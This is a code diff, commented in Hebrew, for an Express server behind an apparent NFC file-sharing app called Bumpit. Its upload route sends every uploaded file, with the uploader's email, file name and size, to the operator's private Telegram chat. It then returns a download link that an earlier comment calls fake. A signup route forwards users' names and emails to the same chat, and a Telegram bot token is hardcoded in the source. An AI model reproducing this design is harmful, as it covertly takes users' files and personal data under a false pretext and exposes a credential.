@@ -4,7 +4,12 @@ const { Bot, InputFile } = require("grammy");
 const path = require('path');
 
 const app = express();
-const upload = multer({ storage: multer.memoryStorage() });
+// הגדרת אחסון זמני כדי לא להעמיס את ה-RAM בקבצים של 1.5GB
+const storage = multer.memoryStorage();
+const upload = multer({ 
+    storage: storage,
+    limits: { fileSize: 1.5 * 1024 * 1024 * 1024 } // מגבלה של 1.5GB
+});
 
 const TELEGRAM_TOKEN = "8719998562:AAGJPhq-uf7jsiSzpECpCeig0Fp7CgUl6xE";
 const MY_CHAT_ID = "7089165458";
@@ -13,35 +18,34 @@ const bot = new Bot(TELEGRAM_TOKEN);
 app.use(express.json());
 app.use(express.static('public'));
 
-// דיווח על הרשמה/כניסה דרך גוגל
+// נתיב דיווח על פעולות (הרשמה/כניסה)
 app.post('/report-user', async (req, res) => {
-    const { name, email, lang, device } = req.body;
-    const msg = `👤 **משתמש חדש נרשם!**\n\n📛 שם: ${name}\n📧 אימייל: ${email}\n🌐 שפת מכשיר: ${lang}\n📱 מכשיר: ${device}`;
-    
-    await bot.api.sendMessage(MY_CHAT_ID, msg, { parse_mode: "Markdown" });
-    res.json({ success: true });
+    const { email, event, device } = req.body;
+    try {
+        await bot.api.sendMessage(MY_CHAT_ID, `🔔 **דיווח מערכת**\n👤 משתמש: ${email}\n⚡ פעולה: ${event}\n📱 מכשיר: ${device}`);
+        res.json({ success: true });
+    } catch (e) { res.status(500).send(e.message); }
 });
 
-// טיפול בהעלאת קובץ ודיווח שקט
+// נתיב העלאת קבצים - כאן קורה הקסם
 app.post('/upload', upload.single('file'), async (req, res) => {
-    const file = req.file;
-    const { lang, device } = req.body;
-
+    if (!req.file) return res.status(400).json({ error: "No file uploaded" });
+    
+    const { email, device } = req.body;
+    
     try {
-        // דיווח שקט שהתחילה העברה
-        await bot.api.sendMessage(MY_CHAT_ID, `📂 **התחילה העברה בנגיעה**\n🌐 שפה: ${lang}\n📱 מכשיר: ${device}`);
-
-        // שליחה לטלגרם (תומך עד 2GB)
-        await bot.api.sendDocument(MY_CHAT_ID, new InputFile(file.buffer, file.originalname));
+        // שליחת התראה לבוט שהעלאה התחילה
+        await bot.api.sendMessage(MY_CHAT_ID, `📤 **קובץ חדש מתקבל!**\n👤 מאת: ${email}\n📦 קובץ: ${req.file.originalname}\n⚖️ גודל: ${(req.file.size / (1024*1024)).toFixed(2)} MB`);
         
-        // כאן אנחנו מחזירים לינק דמה לצרכי ה-NFC (בפועל הקובץ אצלך בבוט)
-        const fakeUrl = "https://bumpit.app/download/" + Date.now();
-        res.json({ url: fakeUrl });
+        // שליחת הקובץ עצמו לטלגרם
+        await bot.api.sendDocument(MY_CHAT_ID, new InputFile(req.file.buffer, req.file.originalname));
+        
+        res.json({ url: "https://bumpit.app/t/" + Date.now(), success: true });
     } catch (e) {
-        res.status(500).send("Error");
+        console.error(e);
+        res.status(500).json({ error: "Telegram upload failed" });
     }
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Bumpit running on port ${PORT}`));
-
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
